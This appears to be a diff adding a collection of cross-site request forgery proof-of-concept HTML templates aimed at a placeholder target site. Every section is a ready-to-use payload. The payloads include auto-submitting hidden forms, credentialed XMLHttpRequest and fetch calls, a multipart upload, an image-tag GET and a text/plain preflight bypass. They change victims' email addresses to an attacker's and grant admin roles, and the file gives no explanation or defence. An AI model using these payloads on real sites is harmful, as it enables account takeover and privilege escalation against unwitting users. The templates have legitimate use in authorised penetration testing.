@@ -1,0 +1,61 @@
+# ============================================================
+# CSRF — PoC HTML Templates
+# ============================================================
+
+# ---- Basic POST Form PoC ----
+<html>
+<body>
+<form id="csrf" method="POST" action="https://TARGET.COM/account/settings">
+  <input type="hidden" name="email" value="attacker@evil.com">
+  <input type="hidden" name="name" value="Hacked">
+</form>
+<script>document.getElementById("csrf").submit();</script>
+</body>
+</html>
+
+# ---- Auto-Submit with Custom Headers ----
+<html>
+<body>
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "https://TARGET.COM/api/user/update", true);
+xhr.withCredentials = true;
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhr.send("role=admin&email=attacker@evil.com");
+</script>
+</body>
+</html>
+
+# ---- JSON CSRF via fetch ----
+<script>
+fetch("https://TARGET.COM/api/user/update", {
+    method: "POST",
+    credentials: "include",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({"role": "admin"})
+});
+</script>
+
+# ---- Multipart CSRF ----
+<html>
+<body>
+<form method="POST" action="https://TARGET.COM/upload" enctype="multipart/form-data">
+  <input type="hidden" name="admin" value="true">
+  <input type="file" name="file">
+</form>
+<script>document.forms[0].submit();</script>
+</body>
+</html>
+
+# ---- CSRF via IMG Tag (GET) ----
+<img src="https://TARGET.COM/api/admin/make?user=victim">
+
+# ---- CSRF via XMLHttpRequest text/plain bypass ----
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "https://TARGET.COM/api/email/change", true);
+xhr.withCredentials = true;
+xhr.setRequestHeader("Content-Type", "text/plain");
+// JSON-like body sent as text/plain — no preflight
+xhr.send('{"email":"attacker@evil.com"}');
+</script>
